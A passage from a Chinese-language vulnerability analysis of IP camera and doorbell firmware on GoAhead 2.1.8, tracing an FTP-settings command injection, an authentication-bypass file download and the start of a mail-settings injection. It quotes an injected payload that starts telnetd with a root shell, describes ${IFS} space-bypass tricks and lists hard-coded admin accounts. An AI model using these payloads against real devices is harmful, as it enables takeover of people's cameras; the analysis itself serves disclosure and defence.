    <span class="n">iRet</span> <span class="o">=</span> <span class="n">GetStrParamValue</span><span class="p">(</span> <span class="n">pparam</span><span class="p">,</span> <span class="s">&quot;user&quot;</span><span class="p">,</span> <span class="n">temp2</span><span class="p">,</span> <span class="mi">31</span> <span class="p">);</span>
    <span class="n">URLDecode</span><span class="p">(</span> <span class="n">temp2</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">temp2</span> <span class="p">),</span> <span class="n">decoderbuf</span><span class="p">,</span> <span class="mi">31</span> <span class="p">);</span>
    <span class="n">strcpy</span><span class="p">(</span> <span class="n">bparam</span><span class="p">.</span><span class="n">stFtpParam</span><span class="p">.</span><span class="n">szFtpUser</span><span class="p">,</span> <span class="n">decoderbuf</span> <span class="p">);</span>

    <span class="n">memset</span><span class="p">(</span> <span class="n">temp2</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">64</span> <span class="p">);</span>
    <span class="n">iRet</span> <span class="o">=</span> <span class="n">GetStrParamValue</span><span class="p">(</span> <span class="n">pparam</span><span class="p">,</span> <span class="s">&quot;pwd&quot;</span><span class="p">,</span> <span class="n">temp2</span><span class="p">,</span> <span class="mi">31</span> <span class="p">);</span>
    <span class="n">URLDecode</span><span class="p">(</span> <span class="n">temp2</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">temp2</span> <span class="p">),</span> <span class="n">decoderbuf</span><span class="p">,</span> <span class="mi">31</span> <span class="p">);</span>
    <span class="n">strcpy</span><span class="p">(</span> <span class="n">bparam</span><span class="p">.</span><span class="n">stFtpParam</span><span class="p">.</span><span class="n">szFtpPwd</span><span class="p">,</span> <span class="n">decoderbuf</span> <span class="p">);</span>
<span class="c1">//我们构造的命名被赋值给了参数bparam.stFtpParam.szFtpPwd</span>
    <span class="n">iRet</span> <span class="o">=</span> <span class="n">GetStrParamValue</span><span class="p">(</span> <span class="n">pparam</span><span class="p">,</span> <span class="s">&quot;dir&quot;</span><span class="p">,</span> <span class="n">temp2</span><span class="p">,</span> <span class="mi">31</span> <span class="p">);</span>
    <span class="n">URLDecode</span><span class="p">(</span> <span class="n">temp2</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">temp2</span> <span class="p">),</span> <span class="n">decoderbuf</span><span class="p">,</span> <span class="mi">31</span> <span class="p">);</span>
    <span class="n">strcpy</span><span class="p">(</span> <span class="n">bparam</span><span class="p">.</span><span class="n">stFtpParam</span><span class="p">.</span><span class="n">szFtpDir</span><span class="p">,</span> <span class="n">decoderbuf</span> <span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">decoderbuf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">strcpy</span><span class="p">(</span><span class="n">bparam</span><span class="p">.</span><span class="n">stFtpParam</span><span class="p">.</span><span class="n">szFtpDir</span><span class="p">,</span> <span class="s">&quot;/&quot;</span> <span class="p">);</span>
    <span class="p">}</span>

    <span class="n">GetIntParamValue</span><span class="p">(</span> <span class="n">pparam</span><span class="p">,</span> <span class="s">&quot;mode&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">iValue</span> <span class="p">);</span>
    <span class="n">bparam</span><span class="p">.</span><span class="n">stFtpParam</span><span class="p">.</span><span class="n">byMode</span> <span class="o">=</span> <span class="n">iValue</span><span class="p">;</span>
    <span class="n">GetIntParamValue</span><span class="p">(</span> <span class="n">pparam</span><span class="p">,</span> <span class="s">&quot;upload_interval&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">iValue</span> <span class="p">);</span>
    <span class="n">bparam</span><span class="p">.</span><span class="n">stFtpParam</span><span class="p">.</span><span class="n">nInterTime</span> <span class="o">=</span> <span class="n">iValue</span><span class="p">;</span>

    <span class="n">iRet</span> <span class="o">=</span> <span class="n">GetStrParamValue</span><span class="p">(</span> <span class="n">pparam</span><span class="p">,</span> <span class="s">&quot;filename&quot;</span><span class="p">,</span> <span class="n">temp1</span><span class="p">,</span> <span class="mi">63</span> <span class="p">);</span>
    <span class="n">URLDecode</span><span class="p">(</span> <span class="n">temp2</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">temp2</span> <span class="p">),</span> <span class="n">decoderbuf</span><span class="p">,</span> <span class="mi">63</span> <span class="p">);</span>
    <span class="n">strcpy</span><span class="p">(</span> <span class="n">bparam</span><span class="p">.</span><span class="n">stFtpParam</span><span class="p">.</span><span class="n">szFileName</span><span class="p">,</span> <span class="n">decoderbuf</span> <span class="p">);</span>
</pre></div>


<p>综上所述，<code>set_ftp.cgi</code>仅仅是将我们请求的各参数写入全局变量中。
接下来是<code>ftptest.cgi</code>部分，也就是调用了<code>iRet = cgisetftptest( pbuf, pparam, byPri );</code>这个函数。在该函数中，最为关键的函数为<code>DoFtpTest();</code>。直接跳到<code>func/ftp.c</code>文件中找到函数<code>DoFtpTest()</code>：</p>
<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">DoFtpTest</span><span class="p">(</span> <span class="kt">void</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span>     <span class="n">iRet</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">iRet</span> <span class="o">=</span> <span class="n">FtpConfig</span><span class="p">(</span> <span class="mh">0x01</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">iRet</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="kt">char</span> <span class="n">cmd</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
        <span class="n">memset</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
        <span class="n">sprintf</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;/tmp/ftpupdate1.sh &gt; %s&quot;</span><span class="p">,</span> <span class="n">FILE_FTP_TEST_RESULT</span><span class="p">);</span>
        <span class="n">iRet</span> <span class="o">=</span> <span class="n">DoSystem</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
        <span class="c1">//iRet = DoSystem( &quot;/tmp/ftpupdate1.sh &gt; /tmp/ftpret.txt&quot; );</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">iRet</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>可以看到，执行 FtpConfig()函数后运行了/tmp/ftpupdate1.sh。先让我们看看 FtpConfig()函数如何
处理该问题：</p>
<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">FtpConfig</span><span class="p">(</span> <span class="kt">char</span> <span class="n">test</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">filename</span> <span class="p">)</span>
<span class="p">{</span>
<span class="p">......</span>
    <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span> <span class="s">&quot;/tmp/ftpupdate1.sh&quot;</span><span class="p">,</span> <span class="s">&quot;wb&quot;</span> <span class="p">);</span>

    <span class="n">memset</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
    <span class="n">sprintf</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;/system/system/bin/ftp -n&lt;&lt;!</span><span class="se">\n</span><span class="s">&quot;</span> <span class="p">);</span>
    <span class="n">fwrite</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">cmd</span> <span class="p">),</span> <span class="n">fp</span> <span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
    <span class="n">sprintf</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;open %s %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">bparam</span><span class="p">.</span><span class="n">stFtpParam</span><span class="p">.</span><span class="n">szFtpSvr</span><span class="p">,</span> <span class="n">bparam</span><span class="p">.</span><span class="n">stFtpParam</span><span class="p">.</span><span class="n">nFtpPort</span> <span class="p">);</span>
    <span class="n">fwrite</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">cmd</span> <span class="p">),</span> <span class="n">fp</span> <span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
    <span class="n">sprintf</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;user %s %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">bparam</span><span class="p">.</span><span class="n">stFtpParam</span><span class="p">.</span><span class="n">szFtpUser</span><span class="p">,</span> <span class="n">bparam</span><span class="p">.</span><span class="n">stFtpParam</span><span class="p">.</span><span class="n">szFtpPwd</span> <span class="p">);</span>
    <span class="n">fwrite</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">cmd</span> <span class="p">),</span> <span class="n">fp</span> <span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
    <span class="n">sprintf</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;binary</span><span class="se">\n</span><span class="s">&quot;</span> <span class="p">);</span>
    <span class="n">fwrite</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">cmd</span> <span class="p">),</span> <span class="n">fp</span> <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">bparam</span><span class="p">.</span><span class="n">stFtpParam</span><span class="p">.</span><span class="n">byMode</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>    <span class="c1">//passive</span>
    <span class="p">{</span>
        <span class="n">memset</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
        <span class="n">sprintf</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;pass</span><span class="se">\n</span><span class="s">&quot;</span> <span class="p">);</span>
        <span class="n">fwrite</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">cmd</span> <span class="p">),</span> <span class="n">fp</span> <span class="p">);</span>
    <span class="p">}</span>
<span class="cp">#ifdef CUSTOM_DIR</span>

    <span class="kt">char</span> <span class="n">sub_temp</span><span class="p">[</span> <span class="mi">128</span> <span class="p">];</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">sub_temp</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
    <span class="c1">//strcpy(sub_temp, bparam.stFtpParam.szFtpDir);</span>
    <span class="n">sprintf</span><span class="p">(</span><span class="n">sub_temp</span><span class="p">,</span> <span class="s">&quot;%s/%s&quot;</span><span class="p">,</span> <span class="n">bparam</span><span class="p">.</span><span class="n">stFtpParam</span><span class="p">.</span><span class="n">szFtpDir</span><span class="p">,</span><span class="n">bparam</span><span class="p">.</span><span class="n">stIEBaseParam</span><span class="p">.</span><span class="n">dwDeviceID</span><span class="p">);</span> 

    <span class="n">flag</span> <span class="o">=</span> <span class="n">sub_dir</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span><span class="n">sub_temp</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">flag</span><span class="p">){</span>
        <span class="n">memset</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
        <span class="n">sprintf</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;cd %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">bparam</span><span class="p">.</span><span class="n">stFtpParam</span><span class="p">.</span><span class="n">szFtpDir</span> <span class="p">);</span>
        <span class="n">fwrite</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">cmd</span> <span class="p">),</span> <span class="n">fp</span> <span class="p">);</span>
    <span class="p">}</span>
<span class="cp">#else</span>
    <span class="n">memset</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
    <span class="n">sprintf</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;cd %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">bparam</span><span class="p">.</span><span class="n">stFtpParam</span><span class="p">.</span><span class="n">szFtpDir</span> <span class="p">);</span>
    <span class="n">fwrite</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">cmd</span> <span class="p">),</span> <span class="n">fp</span> <span class="p">);</span>

<span class="cp">#endif</span>
    <span class="n">memset</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
    <span class="n">sprintf</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;lcd /tmp</span><span class="se">\n</span><span class="s">&quot;</span> <span class="p">);</span>
    <span class="n">fwrite</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">cmd</span> <span class="p">),</span> <span class="n">fp</span> <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">test</span> <span class="o">==</span> <span class="mh">0x01</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">FtpFileTest</span><span class="p">();</span>
        <span class="n">memset</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
        <span class="n">sprintf</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;put ftptest.txt</span><span class="se">\n</span><span class="s">&quot;</span> <span class="p">);</span>
        <span class="n">fwrite</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">cmd</span> <span class="p">),</span> <span class="n">fp</span> <span class="p">);</span>
    <span class="p">}</span>

    <span class="k">else</span>
    <span class="p">{</span>
        <span class="kt">char</span>    <span class="n">filename1</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
        <span class="n">memset</span><span class="p">(</span> <span class="n">filename1</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
        <span class="n">memcpy</span><span class="p">(</span> <span class="n">filename1</span><span class="p">,</span> <span class="n">filename</span> <span class="o">+</span> <span class="mi">5</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">filename</span> <span class="p">)</span> <span class="o">-</span> <span class="mi">5</span> <span class="p">);</span>
        <span class="n">memset</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
        <span class="n">sprintf</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;put %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">filename1</span> <span class="p">);</span>
        <span class="n">fwrite</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">cmd</span> <span class="p">),</span> <span class="n">fp</span> <span class="p">);</span>
    <span class="p">}</span>

    <span class="n">memset</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
    <span class="n">sprintf</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;close</span><span class="se">\n</span><span class="s">&quot;</span> <span class="p">);</span>
    <span class="n">fwrite</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">cmd</span> <span class="p">),</span> <span class="n">fp</span> <span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
    <span class="n">sprintf</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;bye</span><span class="se">\n</span><span class="s">&quot;</span> <span class="p">);</span>
    <span class="n">fwrite</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">cmd</span> <span class="p">),</span> <span class="n">fp</span> <span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
    <span class="n">sprintf</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;!</span><span class="se">\n</span><span class="s">&quot;</span> <span class="p">);</span>
    <span class="n">fwrite</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">cmd</span> <span class="p">),</span> <span class="n">fp</span> <span class="p">);</span>
    <span class="n">fclose</span><span class="p">(</span> <span class="n">fp</span> <span class="p">);</span>
    <span class="n">iRet</span> <span class="o">=</span> <span class="n">access</span><span class="p">(</span> <span class="s">&quot;/tmp/ftpupdate1.sh&quot;</span><span class="p">,</span> <span class="n">X_OK</span> <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">iRet</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">DoSystem</span><span class="p">(</span> <span class="s">&quot;chmod a+x /tmp/ftpupdate1.sh&quot;</span> <span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>至此，逻辑很清晰了。在<code>FtpConfig()</code>函数中，将我们之前在设置的时候输入的各个值写入了<code>/tmp/ftpupdate1.sh</code>中，然后在<code>DoFtpTest()</code>中运行该脚本，导致最后的命令执行。这一点，同样可以在漏洞作者原文中得到证明:</p>
<div class="codehilite"><pre><span></span><span class="err">作者原文中展示的</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ftpupload</span><span class="p">.</span><span class="nl">sh</span><span class="p">:</span>
<span class="o">/</span> <span class="err">#</span> <span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ftpupload</span><span class="p">.</span><span class="n">sh</span> 
<span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">ftp</span> <span class="o">-</span><span class="n">n</span><span class="o">&lt;&lt;!</span>
<span class="n">open</span> <span class="mf">192.168.1.1</span> <span class="mi">21</span>
<span class="n">user</span> <span class="n">ftp</span> <span class="err">$</span><span class="p">(</span><span class="n">telnetd</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">p</span> <span class="mi">25</span><span class="p">)</span><span class="n">ftp</span>
<span class="n">binary</span>
<span class="n">lcd</span> <span class="o">/</span><span class="n">tmp</span>
<span class="n">put</span> <span class="n">ftptest</span><span class="p">.</span><span class="n">txt</span>
<span class="n">close</span>
<span class="n">bye</span>
<span class="o">!</span>
<span class="o">/</span> <span class="err">#</span>
</pre></div>


<p>实际测试中，我们发现:如果直接用作者给出的exp去尝试RCE往往是不能成功的。从<code>http://ip:port/get_params.cgi?user=username&amp;pwd=password</code>可以发现，我们注入的命令在空格处被截断了。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/03/--1.png" /></p>
<p>于是我们用${IFS}替换空格（还可以采用<code>+</code>代替空格）:</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/03/--2.png" /></p>
<p>但是由于有长度限制再次被截断，调整长度，最终成功执行命令:</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/03/--3.png" />
<strong>成功抓住新代码的影子</strong></p>
<h3>3.GoAhead绕过验证文件下载漏洞</h3>
<p>2017年3月9日，Pierre Kim在文章中增加了两个链接，描述了一个GoAhead 2.1.8版本之前的<a href="https://s3-us-west-1.amazonaws.com/cybereasonbucket/wp-content/uploads/2017/03/08194911/PeekabooIOwnYou.pdf">任意文件下载漏洞</a>。攻击者通过使用该漏洞，再结合一个新的远程命令执行漏洞可以再次获取摄像头的最高权限。有意思的是，这个漏洞早在2004年就已被提出并成功修复<a href="http://aluigi.altervista.org/adv/goahead-adv2.txt">（http://aluigi.altervista.org/adv/goahead-adv2.txt）</a>。但是由于众多摄像头仍然使用存在该漏洞的老代码，该漏洞仍然可以在众多摄像头设备复现。</p>
<p>我们也查找了此门铃项目中的GoAhead服务器版本。web/release.txt前三行内容如下：</p>
<div class="codehilite"><pre><span></span>=====================================
GoAhead WebServer 2.1.8 Release Notes
=====================================
</pre></div>


<p>再仔细查看<code>websUrlHandlerRequest()</code>内容，发现并未对该漏洞进行修复，说明该漏洞也影响这个门铃项目。以此类推，本次受影响的摄像头应该也存在这个漏洞，果不其然：
<img alt="" src="https://images.seebug.org/content/images/2017/03/new.png-w331s" />
那么，具体的漏洞成因又是如何呢?让我们来跟进<code>./web/LINUX/main.c</code>了解该漏洞的成因:
<code>initWebs()</code>函数中，关键代码如下:</p>
<div class="codehilite"><pre><span></span><span class="mi">154</span><span class="o">:</span>   <span class="n">umOpen</span><span class="p">();</span>

<span class="mi">157</span><span class="o">:</span>   <span class="n">umAddGroup</span><span class="p">(</span> <span class="n">T</span><span class="p">(</span> <span class="s">&quot;adm&quot;</span> <span class="p">),</span> <span class="mh">0x07</span><span class="p">,</span> <span class="n">AM_DIGEST</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">FALSE</span> <span class="p">);</span>

<span class="mi">159</span><span class="o">:</span>   <span class="n">umAddUser</span><span class="p">(</span> <span class="n">admu</span><span class="p">,</span> <span class="n">admp</span><span class="p">,</span> <span class="n">T</span><span class="p">(</span> <span class="s">&quot;adm&quot;</span> <span class="p">),</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">FALSE</span> <span class="p">);</span>
<span class="mi">160</span><span class="o">:</span>   <span class="n">umAddUser</span><span class="p">(</span> <span class="s">&quot;admin0&quot;</span><span class="p">,</span> <span class="s">&quot;admin0&quot;</span><span class="p">,</span> <span class="n">T</span><span class="p">(</span> <span class="s">&quot;adm&quot;</span> <span class="p">),</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">FALSE</span> <span class="p">);</span>
<span class="mi">161</span><span class="o">:</span>   <span class="n">umAddUser</span><span class="p">(</span> <span class="s">&quot;admin1&quot;</span><span class="p">,</span> <span class="s">&quot;admin1&quot;</span><span class="p">,</span> <span class="n">T</span><span class="p">(</span> <span class="s">&quot;adm&quot;</span> <span class="p">),</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">FALSE</span> <span class="p">);</span>
<span class="mi">162</span><span class="o">:</span>   <span class="n">umAddAccessLimit</span><span class="p">(</span> <span class="n">T</span><span class="p">(</span> <span class="s">&quot;/&quot;</span> <span class="p">),</span> <span class="n">AM_DIGEST</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">T</span><span class="p">(</span> <span class="s">&quot;adm&quot;</span> <span class="p">)</span> <span class="p">);</span>

<span class="mi">224</span><span class="o">:</span>   <span class="n">websUrlHandlerDefine</span><span class="p">(</span> <span class="n">T</span><span class="p">(</span> <span class="s">&quot;&quot;</span> <span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">websSecurityHandler</span><span class="p">,</span> <span class="n">WEBS_HANDLER_FIRST</span> <span class="p">);</span>
<span class="mi">227</span><span class="o">:</span>   <span class="n">websUrlHandlerDefine</span><span class="p">(</span> <span class="n">T</span><span class="p">(</span> <span class="s">&quot;&quot;</span> <span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">websDefaultHandler</span><span class="p">,</span><span class="n">WEBS_HANDLER_LAST</span> <span class="p">);</span>
</pre></div>


<p>其中，<code>150-160</code>中<code>um</code>开头的函数为用户权限控制的相关函数。主要做了以下四件事情:
1. <code>umOpen()</code> 打开用户权限控制
2. <code>umAddGroup()</code> 增加用户组<code>adm</code>，并设置该用户组用户使用HTTP摘要认证方式登录
3. <code>umAddUser()</code> 增加用户<code>admin</code>,<code>admin0</code>,<code>admin1</code>,并且这三个用户均属于<code>adm</code>用户组
4. <code>umAddAccessLimit()</code> 增加限制路径<code>/</code>,凡是以<code>/</code>开头的路径都要通过<code>HTTP摘要认证</code>的方式登录属于<code>adm</code>组的用户。</p>
<p>紧接着，在<code>220</code>多行通过<code>websUrlHandlerDefine()</code>函数运行了两个<code>Handler</code>，<code>websSecurityHandler</code>和<code>websDefaultHandler</code>。在<code>websSecurityHandler</code>中，对<code>HTTP摘要认证方式</code>进行处理。关键代码如下：</p>
<div class="codehilite"><pre><span></span><span class="mi">86</span><span class="o">:</span>           <span class="n">accessLimit</span> <span class="o">=</span> <span class="n">umGetAccessLimit</span><span class="p">(</span> <span class="n">path</span> <span class="p">);</span>

<span class="mi">115</span><span class="o">:</span>         <span class="n">am</span> <span class="o">=</span> <span class="n">umGetAccessMethodForURL</span><span class="p">(</span> <span class="n">accessLimit</span> <span class="p">);</span>
<span class="mi">116</span><span class="o">:</span>         <span class="n">nRet</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="mi">118</span><span class="o">-</span><span class="mi">242</span><span class="o">:</span>  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span> <span class="n">flags</span> <span class="o">&amp;</span> <span class="n">WEBS_LOCAL_REQUEST</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span> <span class="n">debugSecurity</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">){</span><span class="err">……</span><span class="p">}</span>

<span class="mi">245</span><span class="o">:</span>         <span class="k">return</span> <span class="n">nRet</span><span class="p">;</span>
</pre></div>


<p>第86行，<code>umGetAccessLimit()</code>函数用于将我们请求的路径规范化，主要逻辑就是去除路径最后的<code>/</code>或者<code>\\</code>，确保我们请求的是一个文件。<code>umGetAccessMethodForURL()</code>函数用于获取我们请求的路径对应的权限。这里，我们请求的路径是<code>system.ini</code>，根据上文，我们的设置是对<code>/</code>路径需要进行<code>HTTP摘要认证</code>，由于程序判断<code>system.ini</code>不属于<code>/</code>路径，所以这里<code>am</code>为默认的<code>AM_INVALID</code>,即无需验证。</p>
<p>紧接着向下，<code>nRet</code>初始化赋值为0.在<code>118-242</code>行中，如果出现了账号密码错误等情况，则会将<code>nRet</code>赋值为<code>1</code>，表示验证不通过。但是由于我们请求的路径无需验证，所以判断结束时<code>nRet</code>仍为<code>0</code>。因此，顺利通过验证，获取到对应的文件内容。</p>
<p><strong>就这样，我们再次抓住了这个”新代码”的影子，虽然这个2004年的漏洞让我们不得不为新代码这三个字加上了双引号。</strong></p>
<h3>4.远程命令执行漏洞二（需登录）</h3>
<p>在Pierre Kim新增的两个链接中，还介绍了一种新的远程命令执行的方式。即通过<code>set_mail.cgi</code>和<code>mailtest.cgi</code>来执行命令。
与上一个远程命令执行漏洞一样，我们先在<code>func/ieparam.c</code>文件中找到<code>set_mail.cgi</code>和<code>mailtest.cgi</code>的调用过程</p>
<div class="codehilite"><pre><span></span><span class="mi">257</span><span class="o">:</span>    <span class="n">pdst</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">pcmd</span><span class="p">,</span> <span class="s">&quot;set_mail.cgi&quot;</span> <span class="p">);</span>
<span class="mi">258</span><span class="o">:</span>
<span class="mi">259</span><span class="o">:</span>    <span class="k">if</span> <span class="p">(</span> <span class="n">pdst</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="p">)</span>
<span class="mi">260</span><span class="o">:</span>    <span class="p">{</span>
<span class="mi">261</span><span class="o">:</span>        <span class="k">return</span> <span class="n">CGI_IESET_MAIL</span><span class="p">;</span>
<span class="mi">262</span><span class="o">:</span>    <span class="p">}</span>

<span class="mi">348</span><span class="o">:</span>    <span class="n">pdst</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">pcmd</span><span class="p">,</span> <span class="s">&quot;mailtest.cgi&quot;</span> <span class="p">);</span>
<span class="mi">349</span><span class="o">:</span>
